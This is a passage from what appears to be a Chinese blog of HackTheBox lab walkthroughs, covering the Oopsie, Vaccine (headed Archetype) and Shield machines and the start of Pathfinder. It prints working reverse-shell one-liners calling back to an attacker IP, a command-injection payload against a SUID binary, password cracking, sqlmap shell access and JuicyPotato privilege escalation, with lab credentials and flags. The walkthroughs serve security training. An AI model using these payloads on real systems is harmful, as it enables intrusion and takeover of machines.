class="string">&quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">    res = req.get(url, headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;super&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(_)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>id为30, 得到如下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access ID   Name            Email</span><br><span class="line">86575       super admin     superadmin@megacorp.com</span><br></pre></td></tr></table></figure><p>通过在Burpsuite中修改Cookie为<code>Cookie: user=86575; role=super admin</code>来访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />上传weevely的Shell即可获得权限</p><h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2><p>使用python反弹Shell到本机</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><p>获得tty<br />(好像是用于获取一个终端会话, 否则后续的切换用户操作无法进行)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>之前查看用户信息的页面应该用到了SQL的操作<br />那么就可以去找SQL的配置信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line"></span><br><span class="line">&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line">cat: cat: No such file or directory</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到账户信息<code>robert:M3g4C0rpUs3r!</code></p><p>使用该账户信息切换到用户<code>robert</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br><span class="line">M3g4C0rpUs3r!</span><br><span class="line">cat /home/robert/user.txt</span><br><span class="line"></span><br><span class="line">f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure><p>查找有SUID权限的文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>看到一个有意思的文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p>而该用户也有运行权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</span><br></pre></td></tr></table></figure><p>IDA中分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;\n------------------\n: EV Bug Tracker :\n------------------\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Provide Bug ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;---------------\n\n&quot;</span>);</span><br><span class="line">  v3 = geteuid();</span><br><span class="line">  setuid(v3);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)concat(<span class="string">&quot;cat /root/reports/&quot;</span>, v7);</span><br><span class="line">  system(v4);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用户输入<code>v7</code></li><li><code>v7</code>被拼接到&quot;cat /root/reports/&quot;之后在赋值给<code>v4</code></li><li>执行<code>v4</code></li></ul><p>命令注入</p><p>Payload: <code>;cat$IFS$9/root/root.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ;cat$IFS<span class="variable">$9</span>/root/root.txt</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">cat: /root/reports/: Is a directory</span><br><span class="line">af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_archetype-2"><a class="markdownIt-Anchor" href="#hackthebox_archetype-2"></a> HackTheBox_Archetype</h1><p>Linux</p><h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.46</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.46</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2><blockquote><p>The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. – 官方WP</p></blockquote><blockquote><p>尝试使用上台靶机中获取的ftp凭据ftpuser/mc@F1l3ZilL4登录靶机的ftp服务<br /><a href="https://blog.csdn.net/qianxiaoyiran311/article/details/105988795">https://blog.csdn.net/qianxiaoyiran311/article/details/105988795</a></p></blockquote><p>得到FTP账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser:mc@F1l3ZilL4</span><br></pre></td></tr></table></figure><p>登入FTP服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.46</span><br><span class="line">Connected to 10.10.10.46.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.46:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get backup.zip</span><br><span class="line"><span class="built_in">local</span>: backup.zip remote: backup.zip</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> backup.zip (2533 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2533 bytes received <span class="keyword">in</span> 0.23 secs (10.7549 kB/s)</span><br></pre></td></tr></table></figure><p>爆破加密压缩包<code>backup.zip</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip backup.zip -D -p /usr/share/wordlists/rockyou.txt -u</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 741852963</span><br></pre></td></tr></table></figure><p>查看<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span> &gt; passwd</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwerty789        (?)</span><br><span class="line">1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimo</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session complete</span><br></pre></td></tr></table></figure><p>登入Web页面, 看到一个搜索功能<br />使用sqlmap来getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>sqlmap给出的shell不是很好用, 自己再弹个Shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2><p>查看数据库信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = pg_connect(<span class="string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</span><br></pre></td></tr></table></figure><p>得到账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres:P@s5w0rd!</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.10.10.46</span><br><span class="line">P@s5w0rd!</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> postgres: P@s5w0rd!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> postgres on vaccine:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User postgres may run the following commands on vaccine:</span><br><span class="line">    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure><p>vi提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">dd6e058e814260bc70e9bbdef2715849</span><br></pre></td></tr></table></figure><hr /><blockquote><p>来自上一台靶机的FTP账户</p></blockquote><p>本着实践出真知的精神, 再看了一下上一台靶机<strong>Oopsie</strong>的端口开放情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1205/mysqld         </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      800/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1120/sshd           </span><br><span class="line">tcp        0    235 10.10.10.28:41042       10.10.16.51:9996        ESTABLISHED 2166/python3        </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1260/apache2        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      1120/sshd           </span><br><span class="line">tcp6       0      0 10.10.10.28:80          10.10.16.51:58936       ESTABLISHED 1963/apache2</span><br></pre></td></tr></table></figure><p>并没有FTP服务, 那么就是可能这种靶机顺序关系的变更</p><p>我个人不是很认同这种把敏感信息放在其他靶机泄露的设计<br />确切来说, <strong>不应该把这种通过其他靶机泄露敏感信息作为唯一的攻击链</strong><br />在给出这样的一条攻击链的时候应该再给出另外一个攻击链<br />虽然这样的确能够对于连续的靶机渗透, 或者说多层靶机渗透的带来更加贯通的体验<br />但是出现了这种顺序变更的情况之后就会显得十分弄巧成拙, 而且没有应有的后续修改<br />没有<strong>user.txt</strong>也只是给这台机器的2.7分锦上添花了</p><hr /><h1 id="hackthebox_shield"><a class="markdownIt-Anchor" href="#hackthebox_shield"></a> HackTheBox_Shield</h1><p>Windows</p><h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.29</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.29</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描-4"><a class="markdownIt-Anchor" href="#路径扫描-4"></a> 路径扫描</h2><p>扫描到路径<code>/wordpress</code><br /><s>其实根本没扫, 网络环境太差了, 直接看WP的</s></p><h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.29/wordpress/ -e u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>使用上一台靶机的密码<code>P@s5w0rd!</code><br />得到账户<code>admin:P@s5w0rd!</code><br /><s>拳头硬了</s></p><p>登入之后修改插件的代码<br />直接写个Shell进去<br />然后访问<code>/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.php</code>即可</p><h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2><p>蚁剑连WebShell<br />上传nc再弹Shell回来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -e C:\windows\system32\cmd.exe 10.10.16.51 9996</span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 SHIELD</span><br><span class="line">OS Name:                   Microsoft Windows Server 2016 Standard</span><br><span class="line">OS Version:                10.0.14393 N/A Build 14393</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Server</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00376-30000-00299-AA303</span><br><span class="line">Original Install Date:     2/4/2020, 12:58:01 PM</span><br><span class="line">System Boot Time:          6/5/2021, 8:21:33 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 753 MB</span><br><span class="line">Virtual Memory: Max Size:  2,431 MB</span><br><span class="line">Virtual Memory: Available: 1,015 MB</span><br><span class="line">Virtual Memory: In Use:    1,416 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    MEGACORP.LOCAL</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.29</span><br><span class="line">                                 [02]: fe80::98f9:2cd0:ff27:3fbc</span><br><span class="line">                                 [03]: dead:beef::98f9:2cd0:ff27:3fbc</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure><p>没有打补丁的Windows Server 2016 Standard<br />用烂土豆提权<br /><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p><p>写一个反弹Shell的bat脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> start C:\temp\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\temp\shell.bat</span><br></pre></td></tr></table></figure><p>当时因为用linux的习惯就用了双引号把要写入的内容括了起来, 但是Windows会很蛋疼得把双引号也写入, 然后就导致了当时一直不能提权</p><p>看一下权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description                               State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects                     Enabled</span><br></pre></td></tr></table></figure><blockquote><p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t<br />如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u<br />如果均开启，可以选择-t *<br />如果均未开启，那么无法提权<br /><a href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p></blockquote><p>然后在项目上找一个Windows Server 2016 Standard的CLSID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\temp\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">6e9a9fdc6f64e410a68b847bb4b404fa</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_pathfinder"><a class="markdownIt-Anchor" href="#hackthebox_pathfinder"></a> HackTheBox_Pathfinder</h1><p>对于域控的攻击有点超出的我的知识范围了</p><h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -p 1-10000 10.10.10.30</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.30</span><br><span class="line">Host is up (0.57s latency).</span><br><span class="line">Not shown: 9987 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows 